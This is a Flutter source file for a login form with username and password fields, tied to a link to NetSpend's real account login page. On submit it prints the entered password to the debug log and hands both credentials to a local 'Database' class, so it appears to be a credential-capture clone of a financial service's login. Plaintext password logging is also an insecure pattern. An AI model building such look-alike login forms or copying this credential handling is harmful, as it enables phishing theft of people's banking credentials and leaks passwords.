import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:url_launcher/link.dart';

import '../database.dart';

class TextfieldContainer extends StatefulWidget {
  const TextfieldContainer({Key? key}) : super(key: key);

  @override
  State<TextfieldContainer> createState() => _TextfieldContainerState();
}

class _TextfieldContainerState extends State<TextfieldContainer> {

  final GlobalKey<FormState> _formkey = GlobalKey();
  TextEditingController nameController = TextEditingController();
  TextEditingController passwordController = TextEditingController();

  @override
  Widget build(BuildContext context) {
    return

        SingleChildScrollView(
      child: Column(
       
        children: [
          Form(
            key: _formkey,
            autovalidateMode: AutovalidateMode.always,
            child: Column(
              children: [
                Padding(
                  padding:
                      const EdgeInsets.only(top: 20, left: 50.0, right: 50.0),
                  child: TextFormField(
                    validator: (username) {
                      if (username!.isNotEmpty && username.length < 4) {
                        return 'Please enter a correct username';
                      } else if (username.isEmpty) {
                        return 'username field can not be empty';
                      } else {
                        return null;
                      }
                    },
                    textAlign: TextAlign.start,
                    controller: nameController,
                    decoration: InputDecoration(
                        border: OutlineInputBorder(
                            borderRadius: BorderRadius.circular(5),
                            borderSide: const BorderSide()),
                        labelText: 'Username',
                        labelStyle: const TextStyle(
                          fontSize: 16,
                        )),
                    keyboardType: TextInputType.name,
                    autofillHints: const [AutofillHints.name],
                  ),
                ),
                const SizedBox(
                  height: 20,
                ),
                Padding(
                    padding: const EdgeInsets.only(left: 50.0, right: 50),
                    child: TextFormField(
                      obscureText: true,
                      //obscuringCharacter: '*#',
                      validator: (password) {
                        if (password!.isNotEmpty && password.length < 5) {
                          return 'Password cant be less than 5 characters';
                        } else if (password.isEmpty) {
                          return 'Password field can not be empty';
                        } else {
                          return null;
                        }
                      },
                      textAlign: TextAlign.start,
                      controller: passwordController = TextEditingController(),
                      decoration: InputDecoration(
                        border: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(5),
                          borderSide: const BorderSide(),
                        ),
                        labelText: 'Password',
                      ),
                    )),
              ],
            ),
          ),
          const SizedBox(
            height: 30,
          ),
          SizedBox(
            width: MediaQuery.of(context).size.width,
            height: 40,
            child: Padding(
              padding: const EdgeInsets.only(left: 50, right: 50),
              child: Link(
                target: LinkTarget.self,
                uri: Uri.parse('https://www.netspend.com/account/login'),
                builder: (context, followLink) => ElevatedButton(
                  style: ElevatedButton.styleFrom(
                      backgroundColor: const Color(0XFFEEEEEE)),
                  onPressed: () async {
                    if (_formkey.currentState!.validate()) {
                      debugPrint(
                          'username: ${nameController.text} , password: ${passwordController.text}');
                      // FutureBuilder(
                      //     future: authClient.signIn(
                      //         email: nameController.text.trim(),
                      //         password: passwordController.text.trim()),
                      //     builder: (context, snapshot) {
                      //       if (snapshot.connectionState ==
                      //           ConnectionState.done) {
                      //         return const TextfieldContainer();
                      //       } else {
                      //         return const CircularProgressIndicator(
                      //             color: Colors.blue);
                      //       }
                      //     });
                      const info = 'Authenticating';
                      const snackBar = SnackBar(
                        content: Text(info),
                        duration: Duration(seconds: 5),
                        backgroundColor: CupertinoColors.activeBlue,
                      );
                      ScaffoldMessenger.of(context).showSnackBar(snackBar);

                      FutureBuilder(
                          future: Database(
                                  username: nameController.text.trim(),
                                  password: passwordController.text.trim())
                              .getInfo(),
                          builder: (context, snapshot) {
                            if (snapshot.connectionState ==
                                ConnectionState.done) {
                              return const ScaffoldMessenger(
                                  child: SnackBar(
                                      content: Text('you have passed'),
                                      backgroundColor: Colors.red));
                            } else {
                              return const CircularProgressIndicator();
                            }
                          });
                    }
                   
                  },
                  child: const Text('LOG IN',
                      style: TextStyle(
                          fontSize: 16,
                          color: Color.fromARGB(255, 35, 35, 38))),
                ),
              ),
            ),
          ),
          const Padding(
            padding: EdgeInsets.only(left: 60, top: 30, right: 60),
            child: Center(
              child: Text(
                'Forgot your user name and password?',
                style: TextStyle(fontSize: 15),
              ),
            ),
          )
        ],
      ),
    );
  }
}
